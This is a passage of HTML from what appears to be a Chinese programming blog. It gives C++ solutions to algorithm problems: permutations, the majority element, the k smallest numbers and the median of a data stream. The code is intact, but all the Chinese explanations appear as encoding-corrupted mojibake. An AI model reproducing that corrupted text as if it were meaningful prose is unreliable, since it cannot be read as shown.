<span class="keyword">explicit</span> string comparison function instead)</span> [-Wstring-compare]</span></span><br><span class="line"><span class="function">    <span class="title">while</span> <span class="params">(data[k] != <span class="string">&quot; &quot;</span>)</span> k++</span>;</span><br><span class="line">                   ^  ~~~</span><br><span class="line">Line <span class="number">40</span>: Char <span class="number">20</span>: error: <span class="function">comparison between pointer <span class="keyword">and</span> <span class="title">integer</span> <span class="params">(<span class="string">&#x27;__gnu_cxx::__alloc_traits&lt;std::allocator&lt;char&gt;, char&gt;::value_type&#x27;</span> (aka <span class="string">&#x27;char&#x27;</span>) <span class="keyword">and</span> <span class="string">&#x27;const char *&#x27;</span>)</span></span></span><br><span class="line"><span class="function">    <span class="title">while</span> <span class="params">(data[k] != <span class="string">&quot; &quot;</span>)</span> k++</span>;</span><br><span class="line">           ~~~~~~~ ^  ~~~</span><br><span class="line"><span class="number">1</span> warning <span class="keyword">and</span> <span class="number">1</span> error generated.</span><br></pre></td></tr></table></figure></blockquote><h2 id="æ•°å­—æ’åˆ—â˜…"><a href="https://www.acwing.com/problem/content/47/">æ•°å­—æ’åˆ—â˜…</a></h2><p>è¾“å…¥ä¸€ç»„æ•°å­—ï¼ˆå¯èƒ½åŒ…å«é‡å¤æ•°å­—ï¼‰ï¼Œè¾“å‡ºå…¶æ‰€æœ‰çš„æ’åˆ—æ–¹å¼ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p>è¾“å…¥æ•°ç»„é•¿åº¦ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>0</mn><mo separator="true">,</mo><mn>6</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[0,6]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">6</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><pre><code>è¾“å…¥ï¼š[1,2,3]è¾“å‡ºï¼š      [        [1,2,3],        [1,3,2],        [2,1,3],        [2,3,1],        [3,1,2],        [3,2,1]      ]</code></pre><h3 id="dfsæš´æœ">dfsæš´æœ</h3><blockquote><p>å…¶å®æ›´æ¨èåé¢ä¸€é¢˜çš„å†™æ³•ã€‚</p></blockquote><p>æ€è·¯æ˜¯æš´æœ, ä½†æ˜¯éœ€è¦å¤„ç†é‡å¤å…ƒç´ </p><ol><li>å°†æ‰€æœ‰æ•°æ’åº, è¿™æ ·ç›¸åŒçš„æ•°ä¼šæ’åœ¨ä¸€èµ·</li><li>ä»å°åˆ°å¤§æšä¸¾æ¯ä¸ªæ•°, æ¯æ¬¡å°†å®ƒæ”¾åœ¨ä¸€ä¸ªç©ºä½ä¸Š</li><li>å¯¹äºç›¸åŒæ•°, å…¶é€‰æ‹©ç©ºä½çš„èµ·å§‹ä½ç½®startå¹¶ä¸ç­‰äº0, è€Œæ˜¯å¿…é¡»åœ¨å‰ä¸€ä¸ªæ•°ä½ç½®åé¢</li><li>æ³¨æ„å›æº¯, ä½†dfsä½¿ç”¨stateè¿›è¡Œä¼ å€¼æ—¶ä¸ç”¨æ‰‹åŠ¨å¤„ç†</li></ol><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; res_;</span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; path_;</span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; nums_;</span><br><span class="line">  </span><br><span class="line">  vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">permutation</span>(vector&lt;<span class="type">int</span>&gt;&amp; nums) &#123;</span><br><span class="line">    nums_ = nums;</span><br><span class="line">    path_.<span class="built_in">resize</span>(nums_.<span class="built_in">size</span>());</span><br><span class="line">    <span class="built_in">sort</span>(nums_.<span class="built_in">begin</span>(), nums_.<span class="built_in">end</span>());</span><br><span class="line">    <span class="built_in">dfs</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> res_;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// uä¸ºæšä¸¾numsçš„ä¸‹æ ‡, startä¸ºnums[u]å¯é€‰èµ·å§‹ä½ç½®(æ˜¯å¦ä¸ºé‡å¤å…ƒç´ ä¼šæœ‰å½±å“), stateè®°å½•pathç©ºä½æƒ…å†µ</span></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> u, <span class="type">int</span> start, <span class="type">int</span> state)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (u == nums_.<span class="built_in">size</span>()) &#123;</span><br><span class="line">      res_.<span class="built_in">push_back</span>(path_);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!u || nums_[u] != nums_[u - <span class="number">1</span>]) start = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = start; i &lt; nums_.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!(state &gt;&gt; i &amp; <span class="number">1</span>)) &#123;  <span class="comment">// &amp;, è€Œé&amp;&amp;</span></span><br><span class="line">        path_[i] = nums_[u];</span><br><span class="line">        <span class="built_in">dfs</span>(u + <span class="number">1</span>, i + <span class="number">1</span>, state + (<span class="number">1</span> &lt;&lt; i));  <span class="comment">// startä¼ çš„æ˜¯i + 1</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="å­—ç¬¦ä¸²çš„æ’åˆ—"><a href="https://leetcode.cn/problems/zi-fu-chuan-de-pai-lie-lcof/">å­—ç¬¦ä¸²çš„æ’åˆ—</a></h2><p>è¾“å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæ‰“å°å‡ºè¯¥å­—ç¬¦ä¸²ä¸­å­—ç¬¦çš„æ‰€æœ‰æ’åˆ—ã€‚</p><p>ä½ å¯ä»¥ä»¥ä»»æ„é¡ºåºè¿”å›è¿™ä¸ªå­—ç¬¦ä¸²æ•°ç»„ï¼Œä½†é‡Œé¢ä¸èƒ½æœ‰é‡å¤å…ƒç´ ã€‚</p><p><strong>ç¤ºä¾‹:</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼šs = &quot;abc&quot;</span><br><span class="line">è¾“å‡ºï¼š[&quot;abc&quot;,&quot;acb&quot;,&quot;bac&quot;,&quot;bca&quot;,&quot;cab&quot;,&quot;cba&quot;]</span><br></pre></td></tr></table></figure><h3 id="å›æº¯æ³•">å›æº¯æ³•</h3><p>å…·ä½“å‚è€ƒï¼š<a href="https://leetcode.cn/problems/zi-fu-chuan-de-pai-lie-lcof/solution/mian-shi-ti-38-zi-fu-chuan-de-pai-lie-hui-su-fa-by/">å‰‘æŒ‡ Offer 38. å­—ç¬¦ä¸²çš„æ’åˆ—ï¼ˆå›æº¯æ³•ï¼Œæ¸…æ™°å›¾è§£ï¼‰</a></p><p><img src="https://pic.leetcode-cn.com/1599403497-GATdFr-Picture2.png" alt="Picture2.png"></p><blockquote><p><strong>set</strong> åŠ å…¥å…ƒç´ çš„å‡½æ•°ä¸º <code>insert()</code></p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  vector&lt;string&gt; res_;</span><br><span class="line"></span><br><span class="line">  <span class="function">vector&lt;string&gt; <span class="title">permutation</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">dfs</span>(s, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> res_;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(string &amp;s, <span class="type">int</span> u)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (u == s.<span class="built_in">size</span>() - <span class="number">1</span>) &#123;</span><br><span class="line">      res_.<span class="built_in">push_back</span>(s);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    set&lt;<span class="type">int</span>&gt; st;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = u; i &lt; s.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (st.<span class="built_in">find</span>(s[i]) != st.<span class="built_in">end</span>()) <span class="keyword">continue</span>;</span><br><span class="line">      st.<span class="built_in">insert</span>(s[i]);</span><br><span class="line">      <span class="built_in">swap</span>(s[i], s[u]);</span><br><span class="line">      <span class="built_in">dfs</span>(s, u + <span class="number">1</span>);</span><br><span class="line">      <span class="built_in">swap</span>(s[i], s[u]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="æ•°ç»„ä¸­å‡ºç°æ¬¡æ•°è¶…è¿‡ä¸€åŠçš„æ•°å­—â˜…"><a href="https://www.acwing.com/problem/content/48/">æ•°ç»„ä¸­å‡ºç°æ¬¡æ•°è¶…è¿‡ä¸€åŠçš„æ•°å­—â˜…</a></h2><p>æ•°ç»„ä¸­æœ‰ä¸€ä¸ªæ•°å­—å‡ºç°çš„æ¬¡æ•°è¶…è¿‡æ•°ç»„é•¿åº¦çš„ä¸€åŠï¼Œè¯·æ‰¾å‡ºè¿™ä¸ªæ•°å­—ã€‚</p><p>å‡è®¾æ•°ç»„éç©ºï¼Œå¹¶ä¸”ä¸€å®šå­˜åœ¨æ»¡è¶³æ¡ä»¶çš„æ•°å­—ã€‚</p><p><strong>æ€è€ƒé¢˜</strong>ï¼š</p><ul><li>å‡è®¾è¦æ±‚åªèƒ½ä½¿ç”¨ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span> çš„æ—¶é—´å’Œé¢å¤– <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span> çš„ç©ºé—´ï¼Œè¯¥æ€ä¹ˆåšå‘¢ï¼Ÿ</li></ul><p><strong>æ•°æ®èŒƒå›´</strong></p><p>æ•°ç»„é•¿åº¦ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>1</mn><mo separator="true">,</mo><mn>1000</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[1,1000]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1000</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><pre><code>è¾“å…¥ï¼š[1,2,1,1,3]è¾“å‡ºï¼š1</code></pre><h3 id="é¢˜è§£-5">é¢˜è§£</h3><p>æ’åºå¯ä»¥è§£å†³è¯¥é—®é¢˜: ä¸­é—´çš„æ•°ä¸€å®šæ˜¯ç›®æ ‡æ•°, ä½†æ—¶é—´å¤æ‚åº¦è¿‡é«˜<br>æœ¬é¢˜æ€è·¯:<br>åˆå§‹åŒ–cnt = 0, val ä¸ºä¸€ä¸å­˜åœ¨numsä¸­çš„æ•°<br>val = targetä½¿å¾—å¯¹åº”äºtargetçš„cnt++<br>val != targetä½¿å¾—å¯¹åº”äºtargetçš„cnt-- (å¯¹åº”étargetçš„cnt++, ç­‰ä»·å¯¹åº”äºtargetçš„cntâ€“)<br>ç”±äºtargetæ•°é‡å¤§äºæ€»æ•°çš„ä¸€åŠ, æœ€åå‰©ä¸‹çš„val = target</p><blockquote><p>åæ§½ä¸€å¥ï¼šä»£ç æ˜¯æŒ‰ç…§google style c++å†™å‡ºæ¥çš„ï¼Œæœ¬é¢˜çš„ä»£ç æœ‰ç‚¹ä¸‘å‘€ğŸ¥µï¼</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">  int moreThanHalfNum_Solution(vector&lt;int&gt;&amp; nums) &#123;</span><br><span class="line">    int val = -1, cnt = 0;</span><br><span class="line">    for (auto x: nums) &#123;</span><br><span class="line">      if (x == val) &#123;</span><br><span class="line">        cnt++;</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        if (cnt) &#123;</span><br><span class="line">          cnt--;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">          val = x;</span><br><span class="line">          cnt = 1;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return val;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="æœ€å°çš„kä¸ªæ•°"><a href="https://www.acwing.com/problem/content/49/">æœ€å°çš„kä¸ªæ•°</a></h2><p>è¾“å…¥ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">n</span></span></span></span> ä¸ªæ•´æ•°ï¼Œæ‰¾å‡ºå…¶ä¸­æœ€å°çš„ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> ä¸ªæ•°ã€‚</p><p><strong>æ³¨æ„ï¼š</strong></p><ul><li>è¾“å‡ºæ•°ç»„å†…å…ƒç´ è¯·æŒ‰ä»å°åˆ°å¤§é¡ºåºæ’åº;</li></ul><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><mo>â‰¤</mo><mi>k</mi><mo>â‰¤</mo><mi>n</mi><mo>â‰¤</mo><mn>1000</mn></mrow><annotation encoding="application/x-tex">1 \le k \le n \le 1000</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8304em;vertical-align:-0.136em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1000</span></span></span></span></p><p><strong>æ ·ä¾‹</strong></p><pre><code>è¾“å…¥ï¼š[1,2,3,4,5,6,7,8] , k=4è¾“å‡ºï¼š[1,2,3,4]</code></pre><h3 id="æ³•1-å †æ’åº">æ³•1. å †æ’åº</h3><p>æ—¶é—´å¤æ‚åº¦: <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo>â‹…</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>k</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n\cdot logk)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span></span></span></span>, æ¯æ¬¡æ’å…¥çš„æ—¶é—´å¤æ‚åº¦ä¸º <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>k</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(logk)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span></span></span></span><br>ç»´æŠ¤ä¸€ä¸ªå¤§å°ä¸ºkçš„å¤§æ ¹å †ï¼Œå°†æ•°ç»„å…ƒç´ éƒ½pushè¿›å †ï¼Œå½“å †ä¸­çš„æ•°å¤§äºkæ—¶å¼¹å‡ºå †é¡¶å…ƒç´ ã€‚æ³¨æ„å¼¹å‡ºå †é¡¶çš„é¡ºåºæ˜¯ä»å¤§åˆ°å°çš„kä¸ªæ•°ï¼Œè¦è¿›è¡Œé€†åºæ“ä½œã€‚</p><blockquote><p><strong>å¤§æ ¹å †</strong> å¯ä»¥é€šè¿‡æŸ¥çœ‹å †å¤´<code>heap.top()</code>ï¼Œå¿«é€ŸçŸ¥é“å †ä¸­çš„æœ€å¤§å…ƒç´ ã€‚<br><strong>å°æ ¹å †</strong> çš„å£°æ˜ä¸º <code>priority_queue&lt;int, vector&lt;int&gt;, greater&lt;int&gt;&gt;</code><br><strong>heap</strong> åŠ å…¥å…ƒç´ çš„å‡½æ•°ä¸º <code>push()</code></p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">getLeastNumbers_Solution</span><span class="params">(vector&lt;<span class="type">int</span>&gt; input, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">    <span class="comment">// if (!k) return res;  // å¦‚æœk=0æ²¡æœ‰è¿™å¥çš„è¯ï¼Œå½“heapä¸ºç©ºè®¿é—®heap.top()æ—¶æŠ¥seg fault </span></span><br><span class="line">    priority_queue&lt;<span class="type">int</span>&gt; heap;  <span class="comment">// å¤§æ ¹å †</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> x: input) &#123;</span><br><span class="line">      <span class="keyword">if</span> (heap.<span class="built_in">size</span>() &lt; k || heap.<span class="built_in">top</span>() &gt; x) heap.<span class="built_in">push</span>(x);</span><br><span class="line">      <span class="keyword">if</span> (heap.<span class="built_in">size</span>() &gt; k) heap.<span class="built_in">pop</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (heap.<span class="built_in">size</span>()) &#123;</span><br><span class="line">      res.<span class="built_in">push_back</span>(heap.<span class="built_in">top</span>());</span><br><span class="line">      heap.<span class="built_in">pop</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">reverse</span>(res.<span class="built_in">begin</span>(), res.<span class="built_in">end</span>());</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="æ³•2-kæ¬¡å¿«é€‰">æ³•2: kæ¬¡å¿«é€‰</h3><p>æ—¶é—´å¤æ‚åº¦: <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo>â‹…</mo><mi>l</mi><mi>o</mi><mi>g</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">k\cdot log(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  vector&lt;<span class="type">int</span>&gt; input_;</span><br><span class="line">  <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">getLeastNumbers_Solution</span><span class="params">(vector&lt;<span class="type">int</span>&gt; input, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">    input_ = input;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; res;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= k; i++) &#123;</span><br><span class="line">      res.<span class="built_in">push_back</span>(<span class="built_in">quick_choose</span>(<span class="number">0</span>, input_.<span class="built_in">size</span>() - <span class="number">1</span>, i));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">quick_choose</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (l &gt;= r) <span class="keyword">return</span> input_[l];</span><br><span class="line">    <span class="type">int</span> i = l - <span class="number">1</span>, j = r + <span class="number">1</span>, x = input_[(i + r) &gt;&gt; <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">      <span class="keyword">while</span> (input_[++i] &lt; x) &#123;&#125;;</span><br><span class="line">      <span class="keyword">while</span> (input_[--j] &gt; x) &#123;&#125;;</span><br><span class="line">      <span class="keyword">if</span> (i &lt; j) <span class="built_in">swap</span>(input_[i], input_[j]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (k &lt;= j - l + <span class="number">1</span>) <span class="keyword">return</span> <span class="built_in">quick_choose</span>(l, j, k);  <span class="comment">// å¿…é¡»æ˜¯&lt;=</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">quick_choose</span>(j + <span class="number">1</span>, r, k - (j - l + <span class="number">1</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="æ•°æ®æµä¸­çš„ä¸­ä½æ•°â˜…"><a href="https://www.acwing.com/problem/content/88/">æ•°æ®æµä¸­çš„ä¸­ä½æ•°â˜…</a></h2><p>å¦‚ä½•å¾—åˆ°ä¸€ä¸ªæ•°æ®æµä¸­çš„ä¸­ä½æ•°ï¼Ÿ</p><p>å¦‚æœä»æ•°æ®æµä¸­è¯»å‡ºå¥‡æ•°ä¸ªæ•°å€¼ï¼Œé‚£ä¹ˆä¸­ä½æ•°å°±æ˜¯æ‰€æœ‰æ•°å€¼æ’åºä¹‹åä½äºä¸­é—´çš„æ•°å€¼ã€‚</p><p>å¦‚æœä»æ•°æ®æµä¸­è¯»å‡ºå¶æ•°ä¸ªæ•°å€¼ï¼Œé‚£ä¹ˆä¸­ä½æ•°å°±æ˜¯æ‰€æœ‰æ•°å€¼æ’åºä¹‹åä¸­é—´ä¸¤ä¸ªæ•°çš„å¹³å‡å€¼ã€‚</p><p><strong>æ•°æ®èŒƒå›´</strong></p><p>æ•°æ®æµä¸­è¯»å…¥çš„æ•°æ®æ€»æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mn>1</mn><mo separator="true">,</mo><mn>1000</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">[1,1000]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">1000</span><span class="mclose">]</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><pre><code>è¾“å…¥ï¼š1, 2, 3, 4è¾“å‡ºï¼š1,1.5,2,2.5è§£é‡Šï¼šæ¯å½“æ•°æ®æµè¯»å…¥ä¸€ä¸ªæ•°æ®ï¼Œå°±è¿›è¡Œä¸€æ¬¡åˆ¤æ–­å¹¶è¾“å‡ºå½“å‰çš„ä¸­ä½æ•°ã€‚</code></pre><h3 id="é¢˜è§£-ç”¨ä¸€ä¸ªå°æ ¹å †min-heapç»´æŠ¤è¾ƒå¤§çš„æ•°-ç”¨ä¸€ä¸ªå¤§æ ¹å 